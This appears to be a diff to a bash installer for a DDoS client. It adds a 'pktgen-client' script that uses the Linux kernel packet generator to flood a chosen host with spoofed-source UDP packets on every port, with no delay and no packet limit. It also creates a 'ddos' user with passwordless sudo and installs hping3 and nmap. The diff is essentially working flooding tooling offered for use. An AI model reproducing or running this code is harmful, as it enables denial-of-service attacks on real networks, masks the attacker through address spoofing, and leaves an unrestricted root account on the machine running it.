@@ -5,7 +5,7 @@ then
 	exit
 fi
 
-apt-get install -y hping3
+apt-get install -y hping3 nmap
 useradd -M ddos
 echo -e "ddos\tALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 
@@ -22,7 +22,7 @@ ip_pool=\$6
 is_valid_ipv4 () {
     local address=\${1}
     local result=1
-    if [[ "\$address" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+    if [[ "\$address" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$ ]]; then
         oldIFS="\$IFS"
         IFS='.'
         ip=(\$address)
@@ -66,10 +66,10 @@ done
 
 for i in \$(seq 1 1 \$atime)
 do
-	echo "\$i.."
+	printf "\$i.."
 	sleep 1
 done
-echo "done"
+printf "完成."
 
 this_info=\$(pkill -15 hping3)
 
@@ -78,6 +78,136 @@ echo -e "===================\n\$this_info"
 exit
 EOF_CLIENT
 
+cat > pktgen-client << EOF_PKTGEN
+#!/bin/bash
+host=\$1
+#dport=\$2
+atime=\$3
+#ttl_pool=\$4
+thread=\$5
+ip_pool=\$6
+
+# ugly code to get low/high ip address
+oldIFS="\$IFS"
+IFS='.'
+ips=(\$ip_pool)
+ip1=\${ips[0]}
+ip2=\${ips[1]}
+ip3=\${ips[2]}
+ip4=\${ips[3]}
+ipl1=\$(echo \$ip1|awk -F '-' '{print \$1}')
+ipl2=\$(echo \$ip2|awk -F '-' '{print \$1}')
+ipl3=\$(echo \$ip3|awk -F '-' '{print \$1}')
+ipl4=\$(echo \$ip4|awk -F '-' '{print \$1}')
+iph1=\$(echo \$ip1|awk -F '-' '{print \$2}')
+iph2=\$(echo \$ip2|awk -F '-' '{print \$2}')
+iph3=\$(echo \$ip3|awk -F '-' '{print \$2}')
+iph4=\$(echo \$ip4|awk -F '-' '{print \$2}')
+IFS="\$oldIFS"
+ip_low="\$ipl1.\$ipl2.\$ipl3.\$ipl4"
+ip_high="\$iph1.\$iph2.\$iph3.\$iph4"
+
+if [ \$thread -gt \$(nproc) ]
+then
+	thread=\$(nproc)
+fi
+
+PKTGEND=\$((\$thread-1))                # number of CPU's - 1
+D_PERCPU=\$((PKTGEND/2))   # thread per core
+CLONE_SKB="clone_skb 1"   # how many copys of each packet
+PKT_SIZE="pkt_size 0"    # Size of the generated packet
+COUNT="count 0"     # How many packets per thread to send
+DELAY="delay 000"         # delay between packets
+INTERFACES=(eth0 eth1)          # which interface to generate the packets on
+NUM_INT=\${#INTERFACES[@]}
+MAC=\$(nmap -sP -n \$host|grep "MAC Address"|awk '{print \$3}')   # MAC address of the targets interface
+
+if [[ -z \$MAC ]]
+then
+	echo "MAC地址未找到!"
+	exit
+fi
+echo \$MAC
+
+function pgset() {
+    local result
+
+    echo \$1 > \$PGDEV
+
+    result=\$(cat \$PGDEV | grep -F "Result: OK:")
+    if [ "\$result" = "" ]; then
+         cat \$PGDEV | grep -F Result:
+    fi
+}
+
+function pg() {
+    echo inject > \$PGDEV
+    cat \$PGDEV
+}
+
+# Config Start Here
+
+remove_all()
+{
+ # thread config
+ for i in \$(seq 0 \$PKTGEND);do
+  PGDEV=/proc/net/pktgen/kpktgend_"\$i"
+  pgset "rem_device_all"
+ done
+}
+
+remove_all
+
+for i in \$(seq 0 \$PKTGEND);do
+ PGDEV=/proc/net/pktgen/kpktgend_"\$i"
+ for k in \$(seq 0 1 \$((\$NUM_INT-1)));do
+  pgset "add_device \${INTERFACES[\$k]}@\$i"
+ done
+done
+
+# device config
+
+for i in \$(seq 0 1 \$PKTGEND);do
+ for k in \$(seq 0 1 \$((\$NUM_INT-1)));do
+  PGDEV=/proc/net/pktgen/\${INTERFACES[\$k]}@\$i
+  echo "Configuring \$PGDEV"
+  pgset "\$COUNT"
+  pgset "\$CLONE_SKB"
+  pgset "\$PKT_SIZE"
+  pgset "\$DELAY"
+  pgset "flag QUEUE_MAP_CPU"
+  pgset "flag IPDST_RND"
+  pgset "flag FLOW_SEQ"
+  pgset "dst \$host"
+  pgset "flows 2048"
+  pgset "flowlen 30"
+  pgset "dst_mac \$MAC"
+  pgset "udp_dst_min 1"
+  pgset "udp_dst_max 65535"
+  pgset "src_min \$ip_low"
+  pgset "src_max \$ip_high"
+ done
+done
+
+# Time to run
+PGDEV=/proc/net/pktgen/pgctrl
+
+pgset "start" &
+for i in \$(seq 1 1 \$atime)
+do
+	printf "\$i.."
+	sleep 1
+done
+pgset "stop" &
+printf "完成"
+exit
+
+
+EOF_PKTGEN
+
 chmod +x hping3-client
+chmod +x pktgen-client
 cp hping3-client /usr/bin/
+cp pktgen-client /usr/bin/
 rm hping3-client
+rm pktgen-client
